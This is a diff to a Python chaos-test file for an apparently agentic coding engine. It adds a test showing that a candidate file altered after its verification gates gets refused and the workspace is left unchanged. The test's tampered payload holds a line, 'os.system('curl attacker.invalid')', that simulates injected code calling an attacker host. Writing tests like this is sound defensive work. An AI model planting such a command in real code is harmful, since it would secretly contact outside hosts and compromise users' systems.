@@ -43,7 +43,6 @@ from kriya.control.persistence import scan_run_records
 from kriya.control.recovery import recover_workspace
 from kriya.control.run_coordinator import begin_mutating_run
 from kriya.control.run_record import RunLifecycle
-from kriya.static_analysis import model as sa_model
 from kriya.static_analysis.service import StaticAnalysisCandidate, StaticAnalysisService, commit_guard
 from kriya.workflow import commit_service
 from kriya.workflow.checkpoint import checkpoint_path, list_checkpoints
@@ -54,6 +53,7 @@ from kriya.workflow.plan_schema import EngineeringPlan, ExecutionMethod, FileAct
 from kriya.workflow.requirements import derive_requirements
 from kriya.workflow.terminal_gate_service import TerminalGateRequest, TerminalGateService, TerminalGateValidators
 from kriya.workflow.triage import ChangeKind
+from kriya.workflow.verification_binding import VERIFIED_CANDIDATE_EVIDENCE_STALE
 
 GOAL = "add sub to calc.py"
 USER_EDIT = CALC + "# the user's own concurrent edit\n"
@@ -338,6 +338,7 @@ def test_enforce_terminal_refuses_a_candidate_changed_after_its_gates(chaos_case
                 migration_resolution=MigrationResolution(MigrationResolutionStatus.NOT_APPLICABLE),
                 obligation_ledger=ObligationLedger(), requirement_set=derive_requirements(GOAL),
                 autonomy=None, spec_compliance=None, milestone_id="m1",
+                commit_batch=lambda: commit_service.plan_terminal_writes(plan, str(candidate), str(workspace), revisions),
                 static_analysis_candidate=StaticAnalysisCandidate(
                     materialize=lambda: commit_service.plan_terminal_writes(plan, str(candidate), str(workspace), revisions),
                     workspace_path=str(workspace), run_id=run.run_id, unit_id="m1"),
@@ -351,9 +352,34 @@ def test_enforce_terminal_refuses_a_candidate_changed_after_its_gates(chaos_case
                 static_analysis=commit_guard(cfg, report.static_analysis),
             ))
     assert committed.completed is False
-    assert committed.failure["reason_code"] == sa_model.STATIC_ANALYSIS_EVIDENCE_STALE
+    assert committed.failure["reason_code"] == VERIFIED_CANDIDATE_EVIDENCE_STALE
     assert committed.failure["workspace_state"] == "UNCHANGED"
     assert Path(workspace, "calc.py").read_text() == CALC
     chaos_case.assert_tree(allowed={"candidate/calc.py"})
     audit = audit_run_records(workspace)
     chaos_case.observe(committed.failure["reason_code"], workspace_state="UNCHANGED", **audit.evidence())
+
+
+@chaos("D10")
+def test_static_analysis_disabled_a_candidate_changed_after_the_gates_is_refused(chaos_case, tmp_path, monkeypatch):
+    workspace = git_workspace(tmp_path, {"calc.py": CALC, "test_calc.py": TEST_SUB})
+    tampered = CALC_WITH_SUB + "\nimport os\nos.system('curl attacker.invalid')\n"
+
+    def change_candidate(state):
+        assert state.static_analysis_result.outcome.value == "DISABLED"
+        Path(workspace, ".kriya", "worktree", "calc.py").write_text(tampered)
+
+    inject_after_static_analysis_gate(monkeypatch, change_candidate)
+    runtime = _good_runtime()
+    chaos_case.arm()
+    with RuntimeRegistration(runtime):
+        result = run_direct(chaos_engine(chaos_config()), GOAL, workspace)
+    chaos_case.assert_tree(allowed={"ws/.kriya/worktree/calc.py"})
+    assert Path(workspace, "calc.py").read_text() == CALC
+    assert_no_false_pass(result)
+    audit = audit_run_records(workspace)
+    assert typed_failure(result) == "workspace_commit_failed"
+    assert result["workspace_commit_failure"]["reason_code"] == VERIFIED_CANDIDATE_EVIDENCE_STALE
+    assert runtime.count("developer") == 1
+    chaos_case.observe("workspace_commit_failed", reason_code=VERIFIED_CANDIDATE_EVIDENCE_STALE,
+                       developer_requests=1, **audit.evidence())
